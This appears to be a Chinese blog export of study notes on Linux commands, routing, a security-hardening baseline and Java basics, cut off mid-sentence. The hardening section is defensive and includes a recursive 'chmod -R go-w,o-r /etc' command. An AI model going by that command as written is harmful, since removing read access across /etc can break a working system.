pwd    #查找pwd命令所在路径which java   #查找path中java的路径\n 链接\n\n硬链接（Hard Link）\n\n\nA–B，假设B是A的硬链接，那么他们两个指向了同一个文件，允许一个文件拥有多个路径，用户可通过这种机制建立硬链接到一些重要文件上，防止误删\n\n旧文件和新文件都将指向相同的索引节点号\n\n\n软链接（Soft Link）\n\n\n类似Windows下的快捷方式，删除源文件则快捷方式也无法访问\n\n新文件的节点号将指向旧文件\n硬链接相当于镜像，软链接相当于快捷方式\n\n\n符号链接（Symbolic Link）\n\n\n在某些Unix/Linux系统中，符号和软链接都被视为相同的。但是实际的差异是，新的文件和旧文件将指向一个新的Inode号码，这将完全取决于实施\n\ntouch命令创建文件\necho输入字符串\necho &quot;内容&quot; &gt;&gt;file1\n创建链接 ln命令\nln 原文件名 新文件名\n\n-s：创建一个软链接（符号链接）\n\n 举例\n\n创建硬链接\n\n创建123.txt\n[root@ecs2 test]# touch 123.txt[root@ecs2 test]# cat &gt; 123.txtWelcome to this World!^C[root@ecs2 test]# cat 123.txtWelcome to this World!\n创建123.txt和321.txt文件之间的硬链接\n[root@ecs2 test]# ln 123.txt 321.txt[root@ecs2 test]# ls -l总用量 8-rw-r--r-- 2 root root 23 11月  1 22:06 123.txt-rw-r--r-- 2 root root 23 11月  1 22:06 321.txt\n检查文件的索引节点号\n[root@ecs2 test]# ls -li总用量 82359298 -rw-r--r-- 2 root root 23 11月  1 22:06 123.txt2359298 -rw-r--r-- 2 root root 23 11月  1 22:06 321.txt[root@ecs2 test]# cat 321.txtWelcome to this World!\n再创建一个名为456.txt的文件，并使用ln命令将其链接到321.txt\n[root@ecs2 test]# ln 321.txt 456.txt[root@ecs2 test]# ls -li总用量 122359298 -rw-r--r-- 3 root root 23 11月  1 22:06 123.txt2359298 -rw-r--r-- 3 root root 23 11月  1 22:06 321.txt2359298 -rw-r--r-- 3 root root 23 11月  1 22:06 456.txt[root@ecs2 test]# cat 456.txt Welcome to this World![root@ecs2 test]# ls -l总用量 12-rw-r--r-- 3 root root 23 11月  1 22:06 123.txt-rw-r--r-- 3 root root 23 11月  1 22:06 321.txt-rw-r--r-- 3 root root 23 11月  1 22:06 456.txt\n当源文件或这些文件中的任何一个被删除时，它不会影响其他文件\n[root@ecs2 test]# rm 123.txtrm：是否删除普通文件 &quot;123.txt&quot;？y[root@ecs2 test]# ls -l总用量 8-rw-r--r-- 2 root root 23 11月  1 22:06 321.txt-rw-r--r-- 2 root root 23 11月  1 22:06 456.txt[root@ecs2 test]# ls -li总用量 82359298 -rw-r--r-- 2 root root 23 11月  1 22:06 321.txt2359298 -rw-r--r-- 2 root root 23 11月  1 22:06 456.txt[root@ecs2 test]# cat 456.txt Welcome to this World!\n不允许跨目录创建硬链接\n[root@ecs2 /]# mkdir test1[root@ecs2 /]# cd test1[root@ecs2 /]# ln test1 test2ln: &quot;test1&quot;: 不允许将硬链接指向目录\n对一个文件内容的任何更改都将影响并相应地更改其他文件的内容\n[root@ecs2 test]# vim 321.txt[root@ecs2 test]# ls -l总用量 8-rw-r--r-- 2 root root 47 11月  1 22:23 321.txt-rw-r--r-- 2 root root 47 11月  1 22:23 456.txt[root@ecs2 test]# cat 456.txt Welcome to this World!File have been modified\n\n创建软链接\n\n创建src.txt\n[root@ecs2 test]# touch src.txt[root@ecs2 test]# cat &gt; src.txtHello World^C[root@ecs2 test]# ls -l总用量 4-rw-r--r-- 1 root root 12 11月  1 22:27 src.txt\n创建软链接\n[root@ecs2 test]# ln -s src.txt dst.txt[root@ecs2 test]# ls -l总用量 4lrwxrwxrwx 1 root root  7 11月  1 22:28 dst.txt -&gt; src.txt-rw-r--r-- 1 root root 12 11月  1 22:27 src.txt[root@ecs2 test]# cat dst.txt Hello World\n在软链接的情况下，源文件和目标文件的inode号不同。在权限中出现字母l，表明这些是链接。dst.txt-&gt;src.txt将是现在建立的新链接\n[root@ecs2 test]# ls -li总用量 42490371 lrwxrwxrwx 1 root root  7 11月  1 22:28 dst.txt -&gt; src.txt2490370 -rw-r--r-- 1 root root 12 11月  1 22:27 src.txt\n允许对目录进行符号创建\n[root@ecs2 softtest]# mkdir abc[root@ecs2 softtest]# ln -s abc def[root@ecs2 softtest]# ls -l总用量 4drwxr-xr-x 2 root root 4096 11月  1 22:33 abclrwxrwxrwx 1 root root    3 11月  1 22:33 def -&gt; abc\n源和目标的Inode编号不同\n[root@ecs2 softtest]# ls -li总用量 42490373 drwxr-xr-x 2 root root 4096 11月  1 22:33 abc2490374 lrwxrwxrwx 1 root root    3 11月  1 22:33 def -&gt; abc\n一旦创建了这些带有符号链接的目录，就可以在这些目录中创建文件。当在源目录中创建文件时，同样的情况也会反映在目标目录中\n[root@ecs2 softtest]# cd abc[root@ecs2 abc]# touch 123.txt[root@ecs2 abc]# vim 123.txt[root@ecs2 abc]# touch 456.txt[root@ecs2 abc]# cd ..[root@ecs2 softtest]# ls -l总用量 4drwxr-xr-x 2 root root 4096 11月  1 22:35 abclrwxrwxrwx 1 root root    3 11月  1 22:33 def -&gt; abc[root@ecs2 softtest]# cd def[root@ecs2 def]# ls -l总用量 4-rw-r--r-- 1 root root 7 11月  1 22:35 123.txt-rw-r--r-- 1 root root 0 11月  1 22:35 456.txt[root@ecs2 def]# cat 123.txt Hello!\n使用rm和unlink命令删除软链接或符号链接\n# rm &lt;soft-link-filename&gt;# unlink &lt;soft-link-filename&gt;\n删除软链接目录\n# rm &lt;soft-link-directory&gt;# unlink &lt;soft-link-directory&gt;\n vim\n\n\nfilename存在则打开，不存在则新建\n会出现路径不一致的问题！\n\n\n\n命令模式（Command mode）\n用户刚刚启动 vi/vim，便进入了命令模式\n常用命令：\n\ni:切换到输入模式且在光标所在字符前开始插入\na:切换到输入模式且在光标所在字符后开始插入\no:切换到输入模式且在光标所在行的下面另起一新行插入\nx 删除当前光标所在处的字符\n: 切换到底线命令模式以在最底一行输入命令\n\n命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令\n\n\n输入模式（Insert mode）\n在命令模式下按下i就进入了输入模式\n\n字符按键以及Shift组合：输入字符\nENTER：回车键，换行\nBACK SPACE：退格键，删除光标前一个字符\nDEL：删除键，删除光标后一个字符\nh(←)j（↓）k（↑）l（→）：在文本中移动光标\n\nw：往后移动一个单词\nb：往前移动一个单词\ne：移动到单词末尾\n0：移动到行首\n$：移动到行末\n^：移动到行首第一个非空字符\nCtrl+u：向上翻页\nCtrl+d：向下翻页\nG：跳转到末尾行\ngg：跳转到首行\nL：移到屏幕最下端一行\nM：移到屏幕中间\nH：移到屏幕首行\nf[目标字符]：转到光标后的第一个目标字符（F是往前）\n\n\nn：敲数字然后回车，光标往后移动n行\nHOME/END：移动光标到行首/行尾\nPage Up/Page Down：上/下翻页\nInsert：切换光标为输入/替换模式，光标将变成竖线/下划线\nESC：退出输入模式，切换到命令模式\n\n\n\n底线命令模式（Last line mode）\n在命令模式下按下:（英文冒号）就进入了底线命令模式\n基本命令（已省略冒号）\n\nw 保存文件\nq 退出程序\n\n按ESC键可随时退出底线命令模式\n\n\n常用命令\n\n\n\n命令\n含义\n\n\n\n\n:set nu\n设置行号\n\n\n:wq\n储存后离开（若为:wq!则为强制储存后离开）\n\n\nu\n复原前一个动作\n\n\n数字&lt;space&gt;\n光标向右移动这一行的 n 个字符\n\n\n数字&lt;enter&gt;\n光标向下移动n行\n\n\n/word\n向光标之下寻找一个名称为 word 的字符串\n\n\nn\n重复前一个搜寻的动作\n\n\nN\n与 n 刚好相反，为『反向』进行前一个搜寻动作\n\n\n\n其他vim按键\n gcc\ngcc是运行在Linux操作系统上的一个全功能的ANSI C兼容编译器\ngcc [选项] 源文件 [目标文件]gcc –o hello  hello.c\n\n-c：只编译，不链接成可执行文件。编译器只生成.o 后缀的目标文件，通常用于不包含主程序的子程序文件\n-o file：确定输出文件的名称为file，该名称不能和源文件同名。若没有该选项，默认生成可执行文件a.out\n-Idirname：指定头文件的查找目录，将dirname 指定的目录加入程序头文件目录列表中\n-Ldirname：指定库文件的查找目录，将dirname 对应的目录加入程序函数档案库文件的目录列表中\n-lname：在链接过程中，加载名为“libname.a”的函数库（位于系统预设的目录或由-L 选项确定的目录下）\n-Wall：编译文件时发出所有警告信息\n-w：编译文件时不发出任何警告信息\n\n 小技巧\n\n查看文件夹内存大小\n\ndu -sh *\n 服务器CPU持续飙高原因排查\n\n\n检查CPU使用率\ntop\n\n\n检查系统负载\nuptime\n\n\n检查系统资源\nCPU使用率过高可能是因为某个进程使用了大量的系统资源。可以通过使用pidstat命令查看各个进程的资源使用量。\npidstat -p &lt;pid&gt; 1\n其中pid为进程ID。以上命令会每秒钟打印一次该进程的资源使用情况，包括CPU使用率、内存使用量等等。\n\n\n检查进程\n如果找到了某个进程的资源使用率过高，则需要进一步检查该进程。可以使用strace命令来跟踪该进程的系统调用。\nstrace -p &lt;pid&gt;\n以上命令会输出该进程所有的系统调用和返回值，可以帮助我们定位该进程的具体问题。\n\n\n检查系统日志\ntail -f /var/log/messages /var/log/syslog\n以上命令可以实时输出这些文件的最新内容。\n\n\n检查系统瓶颈\n如果以上方法都找不到问题，可以使用系统性能工具来检查系统的瓶颈。其中一种常见的性能工具是perf。可以使用perf top命令来查看系统上耗费CPU时间最多的函数。\nperf top\n以上命令会实时输出系统上相关函数的CPU使用情况。\n\n\n 配置Linux路由\n\nLinux添加路由命令如下：\nroute [add|del] [-net|-host] target [netmask Nm] [gw Gw] [[dev] If]\n\nadd：添加一条路由规则\ndel：删除一条路由规则\n-net：目的地址是一个网络\n-host：目的地址是一个主机\ntarget：目的网络或主机\nnetmask：目的地址的网络掩码\ngw：路由数据包通过的网关\ndev：为路由指定的网络接口\n\n\n添加主机路由\n\n令192.168.2.10主机ping通192.168.0.8主机，则需要经过路由器2，就要在192.168.2.10的主机上添加一条到192.168.0.8的路由\nroute add -host 192.168.0.8  gw 192.168.2.1 dev eth0\n\n访问192.168.0.8的主机消息都从192.168.2.1端口转发\n\nroute命令查看添加的路由\nroot@linux:~# routeDestination     Gateway          Genmask          Flags     Metric     Ref     Use     Iface192.168.0.8     192.168.2.1      255.255.255.255  UGH       0          0       0       eth0192.168.1.0     *                255.255.255.0    U         0          0       0       wlan0192.168.2.0     *                255.255.255.0    U         0          0       0       eth0\n其中\n\n\n\n名称\n解释\n\n\n\n\nDestination\n目标网络或目标主机。Destination为default（0.0.0.0）时，表示这个是默认网关，所有数据都发到这个网关（这里是10.139.128.1）\n\n\nGateway\n网关地址，0.0.0.0 表示当前记录对应的Destination跟本机在同一个网段，通信时不需要经过网关（同一个局域网内2台主机通信不需要经过网关）\n\n\nGenmask\nDestination字段的网络掩码，Destination是主机时需要设置为255.255.255.255，是默认路由时会设置为0.0.0.0\n\n\nFlags\nU：Up表示有效G：Gateway表示连接路由，若无这个字段表示直连目的地址H：Host表示目标是具体主机，而不是网段R：恢复动态路由产生的表项D：由路由的后台程序动态地安装M：由路由的后台程序修改!：拒绝路由\n\n\nMetric\n路由距离，到达指定网络所需的中转数，是大型局域网和广域网设置所必需的（不在Linux内核中使用。）\n\n\nRef\n路由项引用次数（不在Linux内核中使用。）\n\n\nUse\n此路由项被路由软件查找的次数\n\n\nIface\n网卡名字，例如 eth0；要去往这个网段需要使用哪一个网络接口。也就是eth0这张网卡\n\n\n\n则第一条路由信息即为访问主机192.168.0.8的信息都从192.168.2.1网关转发\n删除路由\nroute del 192.168.0.8\n\n添加网络路由\n\n第一种添加主机路由的方式只能访问到一台目录主机，如果192.168.2.10要访问0网段的所有主机的话把0网段主机都添加一遍显然很麻烦，通过添加网络路由的方式，只要在192.168.0.10主机上添加一条0网段的网络路由即可\nroute add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.2.1 dev eth0\n\n这个目标是网络，所以需要设置子网掩码，用route命令查看一下添加的网络路由\n\nroot@linux:~# routeDestination     Gateway          Genmask          Flags     Metric     Ref     Use     Iface192.168.0.0     192.168.2.1      255.255.255.0    UG        0          0       0       eth0192.168.1.0     *                255.255.255.0    U         0          0       0       wlan0192.168.2.0     *                255.255.255.0    U         0          0       0       eth0\n表示访问0网段的消息都从192.168.2.1网关转发\n删除网络路由\nroute del -net 192.168.0.0/24 gw 192.168.2.1\n\n添加默认路由\n\n如果2网段主机想访问其他所以网段的网络，只需要添加默认路由即可\nroute add default gw 192.168.2.1 dev eth0\nroot@linux:~# routeDestination     Gateway          Genmask          Flags     Metric     Ref     Use     Ifacedefault         192.168.2.1      0.0.0.0          UG        0          0       0       eth0192.168.1.0     *                255.255.255.0    U         0          0       0       wlan0192.168.2.0     *                255.255.255.0    U         0          0       0       eth0\n所有访问非2网段的信息都从192.168.2.1转发\n删除默认路由\nroute del default\n 系统安全配置\n 共享账号检查\n用户账号分配检查，避免共享账号存在\n\n配置要求\n\n\n系统需按照实际用户分配账号\n避免不同用户间共享账号，避免用户账号和服务器间通信使用的账号共享\n\n\n操作指南\n\ncat /etc/passwd查看当前所有用户的情况\n\n检查方法\n\ncat /etc/passwd查看当前所有用户的信息，与管理员确认是否有共享账号情况存在\n\n配置方法\n\nuseradd username  #创建账号passwd username   #设置密码\n 多余账户锁定策略\n\n配置要求\n\n应锁定与设备运行、维护等工作无关的账号\n\n操作指南\n\ncat /etc/password查看哪些账户的shell域中为nologin\n\n检查方法\n\n人工检查：\ncat /etc/password后查看多余账户的shell域为nologin为符合\nBVS基线检查：\n多余账户处于锁定状态为符合\n\n配置方法\n\n修改/etc/password文件，将需要锁定的用户的shell域设为nologin或通过passwd –l username锁定账户\n只有具备超级用户权限的使用者方可使用passwd –l username锁定用户，用passwd –d username解锁后原有密码失效，登录需输入新密码\n\n一般情况下，需要锁定的用户：lp,nuucp,hpdb,www,demon\n\n root账户远程登录限制\n\n配置要求\n\n\n限制具备超级管理员权限的用户远程登录\n远程执行管理员权限操作，应先以普通权限用户远程登录后，再切换到超级管理员权限账号后执行相应操作\n\n\n操作指南\n\n使用root账户远程尝试登陆\n\n检查方法\n\n\nroot远程登录不成功，提示“Not on system console”\n普通用户可以登录成功，而且可以切换到root用户\n\n\n配置方法\n\n修改/etc/ssh/sshd_config文件，将PermitRootLogin yes改为PermitRootLogin no，重启sshd服务\n 口令复杂度策略\n\n配置要求\n\n口令长度至少12位，并包括数字、小写字母、大写字母和特殊符号\n\n操作指南\n\ncat /etc/pam.d/system-auth，找到password模块接口的配置部分，找到类似如下的配置行：\npassword  requisite  /lib/security/$ISA/pam_cracklib.so minlen =6\n\n参数说明\n\nretry=N，确定用户创建密码时允许重试的次数\nminlen=N，确定密码最小长度要求，事实上，在默认配置下，此参数代表密码最小长度为N-1\ndcredit=N，当N小于0时，代表新密码中数字字符数量不得少于（-N）个。例如，dcredit=-2代表密码中要至少包含两个数字字符\nucredit=N，当N小于0时，代表则新密码中大写字符数量不得少于（-N）个\nlcredit=N，当N小于0时，代表则新密码中小写字符数量不得少于（-N）个\nocredit=N，当N小于0时，代表则新密码中特殊字符数量不得少于（-N）个\n\n\n\n检查方法\n\ncat /etc/pam.d/system-auth\n口令的最小长度至少12位\n口令最少应包含的字符数量\n口令中最少应包含的字母字符数量\n口令中最少应包含的非字母数字字符数量\n\n配置方法\n\nvim /etc/pam.d/system-auth找到password模块接口的配置部分，按照配置要求内容修改对应属性\n 口令最长生存期策略\n\n配置要求\n\n要求操作系统的账户口令的最长生存期不长于90天\n\n操作指南\n\ncat /etc/login.defs文件中指定配置项\n\nPASS_MAX_DAYS配置项决定密码最长使用期限\nPASS_MIN_DAYS配置项决定密码最短使用期限\nPASS_WARN_AGE配置项决定密码到期提醒时间\n\n\n检查方法\n\nPASS_MAX_DAYS值小于等于90为符合\n“对于采用静态口令认证技术的设备，账户口令的生存期不长于90天”项的当前值：表示当前的口令生存期长度\n\n配置方法\n\nvim /etc/login.defs文件，修改PASS_MAX_DAYS值为小于等于90\n 系统关键目录权限控制\n\n配置要求\n\n根据安全需要，配置某些关键目录其所需的最小权限\n重点要求password配置文件、shadow文件、group文件权限\n当前主流版本的Linux系统在默认情况下即对重要文件做了必要的权限设置，在日常管理和操作过程中应避免修改此类文件权限，除此以外，应定期对权限进行检查及复核，确保权限设置正确\n\n操作指南\n\n查看关键目录的用户对应权限参考命令\nls -l /etc/passwdls -l /etc/shadowls -l /etc/group\n\n检查方法\n\n与管理员确认已有权限为最小权限\n\n配置方法\n\n通过chmod命令对目录的权限进行实际设置\n\n/etc/passwd所有用户都可读，root用户可写-rw-r-r-\nchmod 644 /etc/passwd\n/etc/shadow只有root可读-r------\nchmod 600 /etc/shadow\n/etc/group必须所有用户都可读，root用户可写-rw-r-r-\nchmod 644 /etc/group\n如果是有写权限，就需移去组及其它用户对/etc的写权限（特殊情况除外）\nchmod -R go-w,o-r /etc\n\n 用户缺省权限控制\n\n配置要求\n\n控制用户缺省访问权限，当在创建新文件或目录时应屏蔽掉新文件或目录不应有的访问允许权限,防止同属于该组的其它用户及别的组的用户修改该用户的文件或更高限制\n\n操作指南\n\n\ncat /etc/bashrc查看全局默认设置umask值\n查看具体用户home目录下bash_profile，具体用户的umask\n\n\n检查方法\n\n\n查看全局默认设置umask值为027或更小权限为符合（如有特许权限需求，可根据实际情况判断）\n查看具体用户的umask，本着最小权限的原则\n\n\n\n配置方法\n\n\n单独针对用户设置\n修改用户home目录下的.bash_profile脚本文件，例如，可增加一条语句：umask 027；对于权限要求较严格的场合，建议设置为077\n\n\n全局默认设置\n默认通过全局脚本/etc/bashrc设置所有用户的默认umask值，修改脚本即可实现对用户默认umask值的全局性修改，通常建议将umask设置为027以上，对于权限要求较严格的场合，建议设置为077\n\n\n\n\n 安全日志完备性要求\n\n配置要求\n\n系统应配置完备日志记录，记录对与系统相关的安全事件\n\n操作指南\n\n\ncat /etc/syslog.conf查看是否有对应配置\ncat /var/log/secure查看是否有对应配置\n\n\n检查方法\n\n\ncat /etc/syslog.conf确认有对应配置\n查看/var/log/secure应记录有需要的设备相关的安全事件\n\n\n配置方法\n\nvim /etc/syslog.conf修改配置文件\n配置如下类似语句：\nauthpriv.*\t\t\t/var/log/secure\n定义为需要保存的设备相关安全事件\n 统一远程日志服务器配置\n\n配置要求\n\n当前系统应配置远程日志功能，将需要重点关注的日志内容传输到日志服务器进行备份\n\n操作指南\n\ncat /etc/syslog.conf查看是否有对应配置\n\n检查方法\n\n配置了远程日志服务器为符合\n\n配置方法\n\nvim /etc/syslog.conf修改配置文件加上：\n*.* @192.168.0.1\n可以将&quot;.&quot;替换为实际需要的日志信息。比如：kern.* / mail.* 等等；可以将此处192.168.0.1替换为实际的IP或域名\nservices syslogd restart重新启动syslog服务\n\n*.*和@之间为一个Tab\n\n 设置history时间戳\n\n配置要求\n\n配置history时间戳，便于审计\n\n操作指南\n\ncat /etc/bashrc查看是否有对应配置\n\n检查方法\n\n如export HISTTIMEFORMAT=&quot;%F %T&quot;配置为符合\n\n配置方法\n\n在/etc/bashrc文件中增加如下行：\nexport HISTTIMEFORMAT=&quot;%F %T&quot;\n SSH登录配置\n\n配置要求\n\n系统应配置使用SSH等加密协议进行远程登录维护，并安全配置SSHD的设置。不使用TELENT进行远程登录维护\n\n操作指南\n\n\nps –elf|grep ssh查看SSH服务状态\nps –elf|grep telnet查看telnet服务状态\n\n\n检查方法\n\n\n不能使用telnet进行远程维护\n应使用SSH进行远程维护\nSSH配置要符合如下要求\n\nProtocol  2 #使用ssh2版本X11Forwarding yes #允许窗口图形传输使用ssh加密IgnoreRhosts  yes #完全禁止SSHD使用.rhosts文件RhostsAuthentication no #不设置使用基于rhosts的安全验证RhostsRSAAuthentication no #不设置使用RSA算法的基于rhosts的安全验证HostbasedAuthentication no #不允许基于主机白名单方式认证PermitRootLogin no #不允许root登录PermitEmptyPasswords no #不允许空密码Banner /etc/motd #设置ssh登录时显示的banner\n\n配置方法\n\n编辑sshd_config，添加相关设置，SSHD相关安全设置选项参考检查方法中的描述\n\nps –elf|grep ssh查看SSH服务状态\n\n 关闭不必要的系统服务\n\n配置要求\n\n根据每台机器的不同角色，关闭不需要的系统服务。操作指南中的服务项提供参考，根据服务器的角色和应用情况对启动项进行修改，如无特殊需要，应关闭Sendmail、Telnet、Bind等服务\n\n操作指南\n\nchkconfig --list查看哪些服务开放\n\n检查方法\n\n与管理员确认无用服务已关闭\n\n配置方法\n\n使用如下方式禁用不必要的服务\nservice &lt;服务名&gt; stopchkconfig --level 35 off\nLinux/Unix系统服务中，部分服务存在较高安全风险，应当禁用，包括：\n\n“lpd”，此服务为行式打印机后台程序，用于假脱机打印工作的UNIX后台程序，此服务通常情况下不用，建议禁用\n“telnet”，此服务采用明文传输数据，登陆信息容易被窃取，建议用ssh代替\n“routed”，此服务为路由守候进程，使用动态RIP路由选择协议，建议禁用\n“sendmail”，此服务为邮件服务守护进程，非邮件服务器应将其关闭\n“Bluetooth”，此服务为蓝牙服务，如果不需要蓝牙服务时应关闭\n“identd”，此服务为AUTH服务，在提供用户信息方面与finger类似，一般情况下该服务不是必须的，建议关闭\n“xfs”，此服务为Linux中X Window的字体服务，关于该服务历史上出现过信息泄露和拒绝服务等漏洞，应以减少系统风险\nR服务（“rlogin”、“rwho”、“rsh”、“rexec”），R服务设计上存在严重的安全缺陷，仅适用于封闭环境中信任主机之间便捷访问，其他场合下均必须禁用\n基于inetd/xinetd的服务（daytime、chargen、echo等），此类服务建议禁用\n\n 禁止Control-Alt-Delete键盘关闭命令\n\n配置要求\n\n应禁止使用Control-Alt-Delete组合键重启服务器，防止误操作\n\n操作指南\n\ncat /etc/inittab查看配置\n\n检查方法\n\n/etc/inittab 中应有：“#ca::ctrlaltdel:/sbin/shutdown -t3 -r now”配置为符合\n\n配置方法\n\n在“/etc/inittab” 文件中注释掉下面这行（使用#）：ca::ctrlaltdel:/sbin/shutdown -t3 -r now\n改为： #ca::ctrlaltdel:/sbin/shutdown -t3 -r now\n为了使此改动生效，输入下面这个命令： # /sbin/init q\n\n禁止ctl-alt-del使得在控制台直接按ctl-alt-del不能重新启动计算机\n\n 安装操作系统更新补丁\n\n配置要求\n\n安装操作系统更新补丁，修复系统漏洞\n\n操作指南\n\n\n查看当前系统补丁版本\n检查官网当前系统版本是否发布安全更新\n\n\n检查方法\n\n版本应保持为最新\n\n配置方法\n\n访问系统官网下载补丁安装包，在打开的页面上，选择与自己使用相对应的系统后，点击连接进入补丁包下载列表界面，选择需要的补丁下载\n以rpm安装包举例，将该安装包复制到目标系统上，使用命令rpm –ivh xxx.rpm进行安装，随后重新启动系统，检查所安装补丁的服务或应用程序是否运行正常，即完成该补丁的安装和升级工作\n","tags":["技术栈"]},{"title":"Java","url":"/2023/07/28/Java/","content":" Java\n面向对象的三大特征：封装、继承、多态\n\nJVM（Java Virtual Machine）：Java虚拟机，真正运行Java程序的地方\n核心类库：Java自己写好的程序，给程序员自己的程序调用的\nJRE（Java Runtime Environment）：Java的运行环境\nJDK（Java Development Kit）：Java开发工具包\n\n 变量详解\n 字面量\n\n\n\n常用数据\n生活写法\n程序中写法\n说明\n\n\n\n\n整数\n336，-143\n336，-143\n写法一致\n\n\n小数\n13.14，-5.21\n13.14，-5.21\n写法一致\n\n\n字符\nA,0,我\n‘A’,‘0’,‘我’\n必须使用单引号，有且只有一个字符\n\n\n字符串\n张三\n“hello”,“张三”\n必须使用双引号，内容可有可无\n\n\n布尔值\n真、假\ntrue、false\n\n\n\n空值\n\nnull\n特殊的值，空值\n\n\n\n二进制(BIN)以0B开头\n八进制(OCT)以0开头\n十进制(DEC)\n十六进制(HEX)以0x开头\n 数据类型\n\n整型：byte、short、int、long\n\nbyte：-128~127\n如果希望随便写一个整型字面量默认是long类型需在后面加上L/l\n\n浮点型：float、double\n\n如果希望随便写一个小数字面量默认是float类型需在后面加上F/f\n\n\n字符型：char\n\n\n布尔型：boolean\n\n\n引用数据类型：String\n\n\n定义的变量可用于记住一个字符串数据\n 类型转换\n 自动类型转换\n类型小的变量可直接赋值给类型范围大的变量\n 表达式的自动类型转换\nbyte、short、char→int→long→float→double\n表达式的最终结果类型由表达式中的最高类型决定\n表达式中，byte、short、char直接转换成int类型参与运算\n 强制类型转换\n数据类型 变量2 =（数据类型）变量1、数据\n浮点类型强转成整型，直接丢掉小数部分，保留整数部分返回\n 运算符\n +符号做连接符\n能算则算，不能算就在一起\n 自增自减运算符\n++a：先加再用\na++：先用再加\n 赋值运算符\n自带强制类型转换\n 逻辑运算符\n^：逻辑异或\teg.2&gt;1^3&gt;1\n前后条件结果相同就直接返回false，不同才返回true\n\n相同为假，不同为真\n\n&amp;&amp;：左边为false，右边则不执行\n||：左边为true，右边则不执行\n\n两者与&amp;、|区别：后者无论左边是false还是true，右边都要执行\n\n 运算符的优先级\n\n\n\n优先级\n运算符\n\n\n\n\n1\n()\n\n\n2\n!、-、++、–\n\n\n3\n*、/、%\n\n\n4\n+、-\n\n\n5\n&lt;&lt;、&gt;&gt;、&gt;&gt;&gt;\n\n\n6\n&lt;、&lt;=、&gt;、&gt;=、instanceof\n\n\n7\n==、！=\n\n\n8\n&amp;\n\n\n9\n^\n\n\n10\n|\n\n\n11\n&amp;&amp;\n\n\n12\n||\n\n\n13\n?:\n\n\n14\n=、+=、-=、*=、/=、%=、&amp;=\n\n\n\n Demo1：接收用户键盘输入的数据\n\n 分支结构（if、switch）\n\nswitch使用时注意事项\n\n\n表达式类型只能是byte、short、int、char，JDK5开始支持枚举，JDK7开始支持string，不支持double、float、long\ncase给出的值不允许重复，且只能是字面量，不能是变量\n\n 循环结构（for、while、do-while\n Demo2：随机数random类\n\n 数组\n\n静态初始化数组\n\n数据类型[ ] 数组名=new 数据类型[]{元素1，元素2，…};\n获取数组长度：数组名.length\n\n动态初始化数组\n\n数据类型[] 数组名=new 数据类型[长度]\n 数组在计算机中的执行原理\nJava内存分配：\n\n方法区\n\n编译后的字节码文件先加载到这里\n\n栈\n\n方法运行时所进入的内存，变量也是在这里\n方法被调用的时候，是进入到栈内存中运行\n特点：先进后出\n\n堆\n\nnew出来的东西会在这块内存中开辟空间并产生地址\n\n本地方法栈\n寄存器\n\n图解\n\n 多个变量指向同一个数组\n\n多个数组变量中存储的是同一个数组对象的地址\n多个变量修改的都是同一个数组对象中的数据\n如果某个数组变脸中存储的null代表这个数组变量没有指向对象，需要注意可以输出这个变量，但不能用这个数组变量去访问数据或者访问数组长度\n\n\n会报空指针异常：NullPointerException\n\n Java的参数传递机制\n都是值传递\n基本类型的参数传输存储的数据值\n引用类型的参数传输存储的地址值\n 方法重载\n一个类中出现多个方法的名字相同，但是它们的形参列表是不同的，其它的都不管（如修饰符、返回值类型是否一样都无所谓）\n\n形参列表不同指：形参的个数、类型、顺序不同，不关心形参的名称\n\n 在方法中单独使用return\n在无返回值的方法中使用\n作用：立即跳出并结束当前方法的执行\n 面向对象编程\n\n\n一个代码文件中可以写多个class类，但只能用一个public修饰，且public修饰的类名必须成为代码文件名\n\n\nJava存在自动垃圾回收机制，会自动清除掉垃圾对象\n\n\n this\n就是一个变量，可用在方法中，拿到当前对象\n\n相当于c++里的this，Python中的self\n\n主要用来解决对象的成员变量与方法内部变量的名称一样时导致的访问冲突问题\npublic class Student&#123;    double score;    public void printPass(double score)&#123;        //this.score指向的是对象的score，若不加this.，则两个score遵循就近原则都指向形参，两score恒等，判断为否        if(this.score&gt;score)&#123;            System.out.println(&quot;恭喜&quot;);        &#125;else&#123;            System.out.println(&quot;很遗憾&quot;);        &#125;    &#125;&#125;\n 构造器\n创建对象时同时完成对对象成员变量（属性）的初始化赋值\n\n类似C++的重构\n\npublic class Student&#123;    public Student /** 不填返回值类型 */()&#123;            &#125;&#125;\n\n类在设计时若不写构造器，Java会为类自动生成一个无参构造器\n一旦定义有参构造器，Java不会自动为类生成无参构造器，此时建议自己手写一个无参构造器\n\n 封装\n面向对象的三大特征：封装、继承、多态\n合理暴露、合理隐藏\npublic class Student&#123;    private double score;    public void setScore(double score)&#123;        if(score&gt;=0&amp;&amp;score&lt;=100)&#123;            this.score=score;        &#125;else&#123;            System.out.println(&quot;数据非法&quot;);        &#125;    &#125;    public double getScore()&#123;        return score;    &#125;&#125;\n 实体类JavaBean\n\n一种特殊形式的类\n\n类中的成员变量都要私有，并且要对外提供相应的get、set方法\n类中必须有一个公共的无参的构造器\n\n\n\n实体类只负责数据存取，而对数据的处理交给其他类来完成，以实现数据和数据业务处理相分离\n 常用API\n 包\n\n同一个包下的类，互相可以直接调用\n调用其他包的程序，要先导包才可访问\n\n格式：import 包名.类名;\n\n\n调用Java的程序需先导包才可访问，但Java.lang包下的程序是不需要我们导包的，可直接使用\n调用多个不同包下的程序，而程序名正好一样，此时默认只能导入一个程序，另一个程序必须带包名访问\n\n String\n\n两种创建对象的方式\nString name=&quot;test&quot;String name=new String(&quot;test&quot;);\nString s = &quot;test&quot;;//获取字符串长度System.out.println(s.length());//提取字符串某个索引位置处的字符char c=s.charAt(1);//把字符串转换成字符数组，再进行遍历char[] chars=s.toCharArry();//判断字符串内容，内容一样返回trueString s1=new String(&quot;te&quot;);String s2=new String(&quot;te&quot;);System.out.println(s1.equals(s2));System.out.println(s1==s2);//直接==比较会返回false，因为这是在比较地址//忽略大小写来比较字符串内容String s1=new String(&quot;tE&quot;);String s2=new String(&quot;Te&quot;);System.out.println(s1.equalsIgnoreCase(s2));//截取字符串内容(包前不包后)String s3=&quot;这是一段字符串&quot;;s3.substring(0,6)    //把字符串中的某个内容替换成新内容，并返回新的字符串对象//比如替换敏感词String info=&quot;这是一段脏话&quot;;String s4=info.replace(&quot;脏话&quot;,&quot;**&quot;);//判断字符串中是否包含某个关键字(精准匹配)String info2=&quot;这是一段脏话&quot;;info2.contains(&quot;脏话&quot;);//判断字符串是否以某个字符串开头String 